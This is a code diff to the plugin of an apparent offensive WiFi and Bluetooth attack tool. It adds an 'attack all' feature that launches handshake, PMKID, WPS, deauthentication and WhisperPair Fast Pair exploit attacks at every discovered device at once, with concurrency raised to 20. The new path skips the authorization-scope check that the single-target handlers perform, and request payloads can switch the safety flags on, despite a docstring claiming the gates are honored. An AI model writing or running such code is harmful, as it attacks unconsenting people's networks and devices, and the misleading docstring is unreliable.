@@ -11,15 +11,10 @@ from typing import Any
 
 import structlog
 
-from urban_hs.core import Event, get_config, get_event_bus, get_storage
+from urban_hs.core import get_config, get_event_bus, get_storage
 from urban_hs.core.event_bus import Event, EventHandler
 from urban_hs.core.session_scope import get_active_scope
-from urban_hs.modules.ble import (
-    BLEDevice,
-    FastPairScanner,
-    WhisperPairExploit,
-    WhisperPairTester,
-)
+from urban_hs.modules.ble import BLEDevice, FastPairScanner, WhisperPairExploit, WhisperPairTester
 from urban_hs.modules.wifi import (
     AttackResult,
     AttackStatus,
@@ -42,13 +37,39 @@ logger = structlog.get_logger(__name__)
 @dataclass
 class UrbanHackConfig:
     """Master configuration for Urban Hack Sentinel."""
+
     # WiFi
     wifi_enabled: bool = True
     wifi_interface: str = "wlan0"
     wifi_scan_strategy: str = "passive_only"
     wifi_scan_interval: int = 30
-    wifi_channels_2ghz: list[int] = field(default_factory=lambda: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13])
-    wifi_channels_5ghz: list[int] = field(default_factory=lambda: [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144])
+    wifi_channels_2ghz: list[int] = field(
+        default_factory=lambda: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13]
+    )
+    wifi_channels_5ghz: list[int] = field(
+        default_factory=lambda: [
+            36,
+            40,
+            44,
+            48,
+            52,
+            56,
+            60,
+            64,
+            100,
+            104,
+            108,
+            112,
+            116,
+            120,
+            124,
+            128,
+            132,
+            136,
+            140,
+            144,
+        ]
+    )
     wifi_channels_6ghz: list[int] = field(default_factory=list)
     wifi_attack_timeout: int = 60
     wifi_handshake_timeout: int = 60
@@ -68,6 +89,12 @@ class UrbanHackConfig:
     ble_account_key_flood_enabled: bool = False
     ble_hfp_audio_enabled: bool = False
 
+    # Attack-all (urban_hack.attack_all_request) — total parallel fan-out
+    max_parallel_attacks: int = 20  # sizes the attack semaphore; attacks are I/O/radio bound
+    attack_all_wifi_variants: bool = True  # handshake + pmkid + wps_pixie + wps_pin per AP
+    attack_all_ble_test: bool = True  # WhisperPair vuln test per Fast Pair device
+    attack_all_ble_exploit: bool = False  # chains full exploit; opt-in only
+
     # MAC
     mac_randomize_interval: int = 0
 
@@ -83,7 +110,7 @@ class UrbanHackConfig:
 class UrbanHackPlugin:
     """
     Main Urban Hack Sentinel Plugin.
-    
+
     Manages all modules:
     - WiFi: scanning, handshake/PMKID/WPS/deauth attacks
     - BLE: Fast Pair scanning, WhisperPair vulnerability/exploit
@@ -120,7 +147,7 @@ class UrbanHackPlugin:
         self._running = False
         self._wifi_scan_task = None
         self._ble_scan_task = None
-        self._attack_semaphore = asyncio.Semaphore(3)
+        self._attack_semaphore = asyncio.Semaphore(self.config.max_parallel_attacks)
 
     async def initialize(self) -> None:
         """Initialize all plugin components."""
@@ -151,20 +178,16 @@ class UrbanHackPlugin:
                 deauth_count=self.config.wifi_deauth_count,
             )
             self._pmkid_attack = PMKIDAttack(
-                interface=self.config.wifi_interface,
-                attack_timeout=self.config.wifi_pmkid_timeout,
+                interface=self.config.wifi_interface, attack_timeout=self.config.wifi_pmkid_timeout
             )
             self._wps_pixie_attack = WPSPixieAttack(
-                interface=self.config.wifi_interface,
-                attack_timeout=self.config.wifi_wps_timeout,
+                interface=self.config.wifi_interface, attack_timeout=self.config.wifi_wps_timeout
             )
             self._wps_pin_attack = WPSPinAttack(
-                interface=self.config.wifi_interface,
-                attack_timeout=self.config.wifi_wps_timeout,
+                interface=self.config.wifi_interface, attack_timeout=self.config.wifi_wps_timeout
             )
             self._deauth_attack = DeauthAttack(
-                interface=self.config.wifi_interface,
-                attack_timeout=self.config.wifi_attack_timeout,
+                interface=self.config.wifi_interface, attack_timeout=self.config.wifi_attack_timeout
             )
 
         # Initialize BLE components
@@ -174,7 +197,9 @@ class UrbanHackPlugin:
             self.exploit = WhisperPairExploit(adapter=self.config.ble_adapter)
 
         # Shared components
-        self.geo_mapper = GeoMapper(gpsd_host=self.config.gpsd_host, gpsd_port=self.config.gpsd_port)
+        self.geo_mapper = GeoMapper(
+            gpsd_host=self.config.gpsd_host, gpsd_port=self.config.gpsd_port
+        )
         self.mac_changer = MACChanger(self.config.wifi_interface)
         self.mac_changer.save_original_mac()
 
@@ -260,11 +285,13 @@ class UrbanHackPlugin:
 
                     # Publish event
                     bus = get_event_bus()
-                    await bus.publish(Event(
-                        type="wifi.networks_updated",
-                        payload={"networks": [n.to_dict() for n in networks]},
-                        source="wifi_scanner",
-                    ))
+                    await bus.publish(
+                        Event(
+                            type="wifi.networks_updated",
+                            payload={"networks": [n.to_dict() for n in networks]},
+                            source="wifi_scanner",
+                        )
+                    )
 
             except Exception as e:
                 logger.error("WiFi scan error", error=str(e))
@@ -283,11 +310,13 @@ class UrbanHackPlugin:
                     devices = self.ble_scanner.get_fast_pair_devices()
                     if devices:
                         bus = get_event_bus()
-                        await bus.publish(Event(
-                            type="ble.devices_updated",
-                            payload={"devices": [d.to_dict() for d in devices]},
-                            source="ble_scanner",
-                        ))
+                        await bus.publish(
+                            Event(
+                                type="ble.devices_updated",
+                                payload={"devices": [d.to_dict() for d in devices]},
+                                source="ble_scanner",
+                            )
+                        )
 
                         await self._save_ble_devices(devices)
 
@@ -306,30 +335,34 @@ class UrbanHackPlugin:
     async def _save_wifi_networks(self, networks: list[NetworkInfo]) -> None:
         storage = get_storage()
         for net in networks:
-            await storage.upsert_device({
-                "id": f"wifi_{net.bssid.replace(':', '_')}",
-                "first_seen": net.last_seen,
-                "last_seen": net.last_seen,
-                "type": "wifi_ap",
-                "mac": net.bssid,
-                "vendor": net.vendor,
-                "labels": ["wifi", "access_point"],
-                "meta": net.to_dict(),
-            })
+            await storage.upsert_device(
+                {
+                    "id": f"wifi_{net.bssid.replace(':', '_')}",
+                    "first_seen": net.last_seen,
+                    "last_seen": net.last_seen,
+                    "type": "wifi_ap",
+                    "mac": net.bssid,
+                    "vendor": net.vendor,
+                    "labels": ["wifi", "access_point"],
+                    "meta": net.to_dict(),
+                }
+            )
 
     async def _save_ble_devices(self, devices: list[BLEDevice]) -> None:
         storage = get_storage()
         for device in devices:
-            await storage.upsert_device({
-                "id": f"ble_{device.address.replace(':', '_')}",
-                "first_seen": device.last_seen,
-                "last_seen": device.last_seen,
-                "type": "ble_device",
-                "mac": device.address,
-                "vendor": None,
-                "labels": ["ble", "fast_pair"] if device.is_fast_pair else ["ble"],
-                "meta": device.to_dict(),
-            })
+            await storage.upsert_device(
+                {
+                    "id": f"ble_{device.address.replace(':', '_')}",
+                    "first_seen": device.last_seen,
+                    "last_seen": device.last_seen,
+                    "type": "ble_device",
+                    "mac": device.address,
+                    "vendor": None,
+                    "labels": ["ble", "fast_pair"] if device.is_fast_pair else ["ble"],
+                    "meta": device.to_dict(),
+                }
+            )
 
     async def _mac_randomization_loop(self) -> None:
         interval = self.config.mac_randomize_interval
@@ -351,9 +384,12 @@ class UrbanHackPlugin:
         async with self._attack_semaphore:
             if not self._handshake_attack:
                 return AttackResult(
-                    attack_type="handshake", target_bssid=bssid, target_essid=essid,
-                    status=AttackStatus.FAILED, started_at=datetime.utcnow(),
-                    error_message="Handshake attack not initialized"
+                    attack_type="handshake",
+                    target_bssid=bssid,
+                    target_essid=essid,
+                    status=AttackStatus.FAILED,
+                    started_at=datetime.utcnow(),
+                    error_message="Handshake attack not initialized",
                 )
             return await self._handshake_attack.execute(
                 target_bssid=bssid, target_essid=essid, channel=channel, callback=progress_callback
@@ -369,9 +405,12 @@ class UrbanHackPlugin:
         async with self._attack_semaphore:
             if not self._pmkid_attack:
                 return AttackResult(
-                    attack_type="pmkid", target_bssid=bssid, target_essid=essid,
-                    status=AttackStatus.FAILED, started_at=datetime.utcnow(),
-                    error_message="PMKID attack not initialized"
+                    attack_type="pmkid",
+                    target_bssid=bssid,
+                    target_essid=essid,
+                    status=AttackStatus.FAILED,
+                    started_at=datetime.utcnow(),
+                    error_message="PMKID attack not initialized",
                 )
             return await self._pmkid_attack.execute(
                 target_bssid=bssid, target_essid=essid, channel=channel, callback=progress_callback
@@ -387,9 +426,12 @@ class UrbanHackPlugin:
         async with self._attack_semaphore:
             if not self._wps_pixie_attack:
                 return AttackResult(
-                    attack_type="wps_pixie", target_bssid=bssid, target_essid=essid,
-                    status=AttackStatus.FAILED, started_at=datetime.utcnow(),
-                    error_message="WPS Pixie attack not initialized"
+                    attack_type="wps_pixie",
+                    target_bssid=bssid,
+                    target_essid=essid,
+                    status=AttackStatus.FAILED,
+                    started_at=datetime.utcnow(),
+                    error_message="WPS Pixie attack not initialized",
                 )
             return await self._wps_pixie_attack.execute(
                 target_bssid=bssid, target_essid=essid, channel=channel, callback=progress_callback
@@ -405,9 +447,12 @@ class UrbanHackPlugin:
         async with self._attack_semaphore:
             if not self._wps_pin_attack:
                 return AttackResult(
-                    attack_type="wps_pin", target_bssid=bssid, target_essid=essid,
-                    status=AttackStatus.FAILED, started_at=datetime.utcnow(),
-                    error_message="WPS PIN attack not initialized"
+                    attack_type="wps_pin",
+                    target_bssid=bssid,
+                    target_essid=essid,
+                    status=AttackStatus.FAILED,
+                    started_at=datetime.utcnow(),
+                    error_message="WPS PIN attack not initialized",
                 )
             return await self._wps_pin_attack.execute(
                 target_bssid=bssid, target_essid=essid, channel=channel, callback=progress_callback
@@ -428,19 +473,24 @@ class UrbanHackPlugin:
         async with self._attack_semaphore:
             if not self._deauth_attack:
                 return AttackResult(
-                    attack_type="deauth", target_bssid=bssid, target_essid=essid,
-                    status=AttackStatus.FAILED, started_at=datetime.utcnow(),
-                    error_message="Deauth attack not initialized"
+                    attack_type="deauth",
+                    target_bssid=bssid,
+                    target_essid=essid,
+                    status=AttackStatus.FAILED,
+                    started_at=datetime.utcnow(),
+                    error_message="Deauth attack not initialized",
                 )
             return await self._deauth_attack.execute(
-                target_bssid=bssid, target_essid=essid, channel=channel,
-                client_mac=client_mac, count=count, callback=progress_callback
+                target_bssid=bssid,
+                target_essid=essid,
+                channel=channel,
+                client_mac=client_mac,
+                count=count,
+                callback=progress_callback,
             )
 
     async def execute_ble_vuln_test(
-        self,
-        address: str,
-        progress_callback: Callable[[str], None] | None = None,
+        self, address: str, progress_callback: Callable[[str], None] | None = None
     ) -> dict[str, Any]:
         """Test a BLE device for WhisperPair vulnerability."""
         if not self.config.ble_whisperpair_test_enabled:
@@ -448,6 +498,7 @@ class UrbanHackPlugin:
 
         if not self.ble_tester:
             from urban_hs.modules.ble import WhisperPairTester
+
             self.ble_tester = WhisperPairTester(adapter=self.config.ble_adapter)
 
         def progress_cb(msg: str):
@@ -455,6 +506,117 @@ class UrbanHackPlugin:
                 progress_callback(msg)
 
         return await self.ble_tester.test_device(address)
+
+    async def attack_all(
+        self, progress_callback: Callable[[str], None] | None = None
+    ) -> dict[str, Any]:
+        """Fan-out total parallel attack across every discovered target.
+
+        Pulls current WiFi APs and BLE devices from storage, then fires every
+        enabled attack variant at every target concurrently via asyncio.gather.
+        Safety gates (active attacks, exploit opt-in) are still honored; the
+        attack semaphore (``max_parallel_attacks``) bounds real concurrency.
+        """
+        storage = get_storage()
+        tasks: list[asyncio.Task] = []
+
+        def log(msg: str) -> None:
+            logger.info("attack_all", message=msg)
+            if progress_callback:
+                progress_callback(msg)
+
+        async def _devices(device_type: str) -> list[dict[str, Any]]:
+            # Never let a slow/uninitialised storage layer hang the fan-out.
+            try:
+                return await asyncio.wait_for(
+                    storage.list_devices(device_type=device_type), timeout=15
+                )
+            except Exception as exc:
+                log(f"storage.list_devices({device_type}) unavailable: {exc}")
+                return []
+
+        # WiFi APs
+        for ap in await _devices("wifi_ap"):
+            meta = ap.get("meta", {}) if isinstance(ap, dict) else {}
+            if isinstance(meta, str):
+                import json as _json
+
+                try:
+                    meta = _json.loads(meta)
+                except Exception:
+                    meta = {}
+            bssid = ap.get("mac") or meta.get("bssid")
+            essid = ap.get("essid") or meta.get("essid")
+            channel = int(meta.get("channel", 1) or 1)
+            if not bssid:
+                continue
+            if self.config.attack_all_wifi_variants:
+                for fn in (
+                    self.execute_handshake_attack,
+                    self.execute_pmkid_attack,
+                    self.execute_wps_pixie_attack,
+                    self.execute_wps_pin_attack,
+                ):
+                    tasks.append(
+                        asyncio.create_task(
+                            fn(bssid=bssid, essid=essid, channel=channel, progress_callback=log),
+                            name=f"wifi:{fn.__name__}:{bssid}",
+                        )
+                    )
+            if self.config.wifi_enable_active_attacks:
+                tasks.append(
+                    asyncio.create_task(
+                        self.execute_deauth(bssid=bssid, channel=channel, progress_callback=log),
+                        name=f"wifi:deauth:{bssid}",
+                    )
+                )
+
+        # BLE Fast Pair devices
+        for dev in await _devices("ble_device"):
+            addr = dev.get("mac")
+            if not addr:
+                continue
+            if self.config.attack_all_ble_test:
+                tasks.append(
+                    asyncio.create_task(
+                        self.execute_ble_vuln_test(addr, progress_callback=log),
+                        name=f"ble:test:{addr}",
+                    )
+                )
+            if self.config.attack_all_ble_exploit and self.config.ble_whisperpair_exploit_enabled:
+                tasks.append(
+                    asyncio.create_task(
+                        self._exploit_ble(addr, progress_callback=log), name=f"ble:exploit:{addr}"
+                    )
+                )
+
+        log(f"attack_all dispatched {len(tasks)} tasks")
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        ok = sum(1 for r in results if not isinstance(r, BaseException))
+        errors = [str(r) for r in results if isinstance(r, BaseException)]
+        log(f"attack_all done: {ok}/{len(tasks)} ok, {len(errors)} errors")
+        return {"dispatched": len(tasks), "ok": ok, "errors": errors}
+
+    async def _exploit_ble(
+        self, address: str, progress_callback: Callable[[str], None] | None = None
+    ) -> dict[str, Any]:
+        """Run the full WhisperPair chain for one device (no event round-trip)."""
+        if not self.config.ble_whisperpair_exploit_enabled:
+            return {"status": "disabled"}
+        from urban_hs.modules.ble.exploit_chain import WhisperPairFullExploit
+
+        exploit = WhisperPairFullExploit(
+            target_mac=address,
+            adapter_ble=self.config.ble_adapter,
+            hfp_enabled=self.config.ble_hfp_audio_enabled,
+        )
+
+        def cb(msg: str) -> None:
+            logger.info("ble.exploit", message=msg)
+            if progress_callback:
+                progress_callback(msg)
+
+        return await exploit.run_full_chain(progress_callback=cb)
 
 
 # Event handler for all events
@@ -467,10 +629,16 @@ class UrbanHackEventHandler(EventHandler):
     @property
     def event_types(self) -> set[str]:
         return {
-            "config.loaded", "config.reloaded",
-            "wifi.scan_request", "wifi.attack_request",
-            "ble.scan_request", "ble.test_request", "ble.exploit_request",
-            "network.scan_request", "camera.discovery_request",
+            "config.loaded",
+            "config.reloaded",
+            "wifi.scan_request",
+            "wifi.attack_request",
+            "ble.scan_request",
+            "ble.test_request",
+            "ble.exploit_request",
+            "network.scan_request",
+            "camera.discovery_request",
+            "urban_hack.attack_all_request",
         }
 
     async def handle(self, event: Event) -> None:
@@ -486,6 +654,33 @@ class UrbanHackEventHandler(EventHandler):
             await self._handle_ble_test(event)
         elif event.type == "ble.exploit_request":
             await self._handle_ble_exploit(event)
+        elif event.type == "urban_hack.attack_all_request":
+            await self._handle_attack_all(event)
+
+    async def _handle_attack_all(self, event: Event) -> None:
+        payload = event.payload or {}
+        # Per-call overrides of the attack-all policy flags.
+        for key in (
+            "attack_all_wifi_variants",
+            "attack_all_ble_test",
+            "attack_all_ble_exploit",
+            "wifi_enable_active_attacks",
+        ):
+            if key in payload:
+                setattr(self.plugin.config, key, payload[key])
+
+        summary = await self.plugin.attack_all(
+            progress_callback=lambda m: logger.info("attack_all", message=m)
+        )
+        bus = get_event_bus()
+        await bus.publish(
+            Event(
+                type="urban_hack.attack_all_complete",
+                payload=summary,
+                source="urban_hack.plugin",
+                correlation_id=event.correlation_id,
+            )
+        )
 
     async def _update_config(self, config_data: dict[str, Any]) -> None:
         for key, value in config_data.items():
@@ -497,17 +692,17 @@ class UrbanHackEventHandler(EventHandler):
         channels = payload.get("channels")
         duration = payload.get("duration", 30)
 
-        networks = await self.plugin.wifi_scanner.manager.scan(
-            channels=channels, duration=duration
-        )
+        networks = await self.plugin.wifi_scanner.manager.scan(channels=channels, duration=duration)
 
         bus = get_event_bus()
-        await bus.publish(Event(
-            type="wifi.scan_complete",
-            payload={"networks": [n.to_dict() for n in networks]},
-            source="urban_hack.plugin",
-            correlation_id=event.correlation_id,
-        ))
+        await bus.publish(
+            Event(
+                type="wifi.scan_complete",
+                payload={"networks": [n.to_dict() for n in networks]},
+                source="urban_hack.plugin",
+                correlation_id=event.correlation_id,
+            )
+        )
 
     async def _handle_wifi_attack(self, event: Event) -> None:
         payload = event.payload
@@ -522,15 +717,18 @@ class UrbanHackEventHandler(EventHandler):
             get_active_scope().validate(bssid, "wifi")
         except PermissionError as exc:
             bus = get_event_bus()
-            await bus.publish(Event(
-                type="wifi.attack_denied",
-                payload={"bssid": bssid, "type": attack_type, "reason": str(exc)},
-                source="urban_hack.plugin",
-                correlation_id=event.correlation_id,
-            ))
+            await bus.publish(
+                Event(
+                    type="wifi.attack_denied",
+                    payload={"bssid": bssid, "type": attack_type, "reason": str(exc)},
+                    source="urban_hack.plugin",
+                    correlation_id=event.correlation_id,
+                )
+            )
             return
 
         progress_updates = []
+
         def progress_cb(msg: str):
             progress_updates.append(msg)
 
@@ -538,47 +736,66 @@ class UrbanHackEventHandler(EventHandler):
         try:
             if attack_type == "handshake":
                 result = await self.plugin.execute_handshake_attack(
-                    bssid=bssid, essid=payload.get("essid"),
-                    channel=payload.get("channel", 1), progress_callback=lambda m: progress_updates.append(m)
+                    bssid=bssid,
+                    essid=payload.get("essid"),
+                    channel=payload.get("channel", 1),
+                    progress_callback=lambda m: progress_updates.append(m),
                 )
             elif attack_type == "pmkid":
                 result = await self.plugin.execute_pmkid_attack(
-                    bssid=bssid, essid=payload.get("essid"),
-                    channel=payload.get("channel", 1), progress_callback=lambda m: progress_updates.append(m)
+                    bssid=bssid,
+                    essid=payload.get("essid"),
+                    channel=payload.get("channel", 1),
+                    progress_callback=lambda m: progress_updates.append(m),
                 )
             elif attack_type == "wps_pixie":
                 result = await self.plugin.execute_wps_pixie_attack(
-                    bssid=bssid, essid=payload.get("essid"),
-                    channel=payload.get("channel", 1), progress_callback=lambda m: progress_updates.append(m)
+                    bssid=bssid,
+                    essid=payload.get("essid"),
+                    channel=payload.get("channel", 1),
+                    progress_callback=lambda m: progress_updates.append(m),
                 )
             elif attack_type == "wps_pin":
                 result = await self.plugin.execute_wps_pin_attack(
-                    bssid=bssid, essid=payload.get("essid"),
-                    channel=payload.get("channel", 1), progress_callback=lambda m: progress_updates.append(m)
+                    bssid=bssid,
+                    essid=payload.get("essid"),
+                    channel=payload.get("channel", 1),
+                    progress_callback=lambda m: progress_updates.append(m),
                 )
             elif attack_type == "deauth":
                 result = await self.plugin.execute_deauth(
-                    bssid=bssid, essid=payload.get("essid"),
+                    bssid=bssid,
+                    essid=payload.get("essid"),
                     channel=payload.get("channel", 1),
                     client_mac=payload.get("client_mac"),
                     count=payload.get("count", 10),
-                    progress_callback=lambda m: progress_updates.append(m)
+                    progress_callback=lambda m: progress_updates.append(m),
                 )
 
             bus = get_event_bus()
-            await bus.publish(Event(
-                type="wifi.attack_complete",
-                payload={"result": result.to_dict() if result else None, "progress": progress_updates},
-                source="urban_hack.plugin", correlation_id=event.correlation_id,
-            ))
+            await bus.publish(
+                Event(
+                    type="wifi.attack_complete",
+                    payload={
+                        "result": result.to_dict() if result else None,
+                        "progress": progress_updates,
+                    },
+                    source="urban_hack.plugin",
+                    correlation_id=event.correlation_id,
+                )
+            )
 
         except Exception as e:
             logger.error("WiFi attack failed", error=str(e))
             bus = get_event_bus()
-            await bus.publish(Event(
-                type="wifi.attack_failed", payload={"error": str(e)},
-                source="urban_hack.plugin", correlation_id=event.correlation_id,
-            ))
+            await bus.publish(
+                Event(
+                    type="wifi.attack_failed",
+                    payload={"error": str(e)},
+                    source="urban_hack.plugin",
+                    correlation_id=event.correlation_id,
+                )
+            )
 
     async def _handle_ble_scan(self, event: Event) -> None:
         payload = event.payload
@@ -592,11 +809,14 @@ class UrbanHackEventHandler(EventHandler):
             devices = self.plugin.ble_scanner.get_fast_pair_devices()
 
             bus = get_event_bus()
-            await bus.publish(Event(
-                type="ble.scan_complete",
-                payload={"devices": [d.to_dict() for d in devices]},
-                source="urban_hack.plugin", correlation_id=event.correlation_id,
-            ))
+            await bus.publish(
+                Event(
+                    type="ble.scan_complete",
+                    payload={"devices": [d.to_dict() for d in devices]},
+                    source="urban_hack.plugin",
+                    correlation_id=event.correlation_id,
+                )
+            )
 
     async def _handle_ble_test(self, event: Event) -> None:
         payload = event.payload
@@ -613,31 +833,39 @@ class UrbanHackEventHandler(EventHandler):
             get_active_scope().validate(address, "ble")
         except PermissionError as exc:
             bus = get_event_bus()
-            await bus.publish(Event(
-                type="ble.attack_denied",
-                payload={"address": address, "reason": str(exc)},
-                source="urban_hack.plugin",
-                correlation_id=event.correlation_id,
-            ))
+            await bus.publish(
+                Event(
+                    type="ble.attack_denied",
+                    payload={"address": address, "reason": str(exc)},
+                    source="urban_hack.plugin",
+                    correlation_id=event.correlation_id,
+                )
+            )
             return
 
         result = await self.plugin.execute_ble_vuln_test(address)
 
         bus = get_event_bus()
-        await bus.publish(Event(
-            type="ble.test_complete",
-            payload={"result": result},
-            source="urban_hack.plugin", correlation_id=event.correlation_id,
-        ))
+        await bus.publish(
+            Event(
+                type="ble.test_complete",
+                payload={"result": result},
+                source="urban_hack.plugin",
+                correlation_id=event.correlation_id,
+            )
+        )
 
     async def _handle_ble_exploit(self, event: Event) -> None:
         if not self.plugin.config.ble_whisperpair_exploit_enabled:
             bus = get_event_bus()
-            await bus.publish(Event(
-                type="ble.exploit_failed",
-                payload={"error": "Exploit not enabled in config"},
-                source="urban_hack.plugin", correlation_id=event.correlation_id,
-            ))
+            await bus.publish(
+                Event(
+                    type="ble.exploit_failed",
+                    payload={"error": "Exploit not enabled in config"},
+                    source="urban_hack.plugin",
+                    correlation_id=event.correlation_id,
+                )
+            )
             return
 
         payload = event.payload
@@ -651,12 +879,14 @@ class UrbanHackEventHandler(EventHandler):
             get_active_scope().validate(address, "ble")
         except PermissionError as exc:
             bus = get_event_bus()
-            await bus.publish(Event(
-                type="ble.attack_denied",
-                payload={"address": address, "reason": str(exc)},
-                source="urban_hack.plugin",
-                correlation_id=event.correlation_id,
-            ))
+            await bus.publish(
+                Event(
+                    type="ble.attack_denied",
+                    payload={"address": address, "reason": str(exc)},
+                    source="urban_hack.plugin",
+                    correlation_id=event.correlation_id,
+                )
+            )
             return
 
         # Run the real WhisperPair (CVE-2025-36911) multi-strategy KBP chain.
@@ -679,11 +909,14 @@ class UrbanHackEventHandler(EventHandler):
             event_type = "ble.exploit_failed"
 
         bus = get_event_bus()
-        await bus.publish(Event(
-            type=event_type,
-            payload={"result": result},
-            source="urban_hack.plugin", correlation_id=event.correlation_id,
-        ))
+        await bus.publish(
+            Event(
+                type=event_type,
+                payload={"result": result},
+                source="urban_hack.plugin",
+                correlation_id=event.correlation_id,
+            )
+        )
 
 
 # Plugin entry point
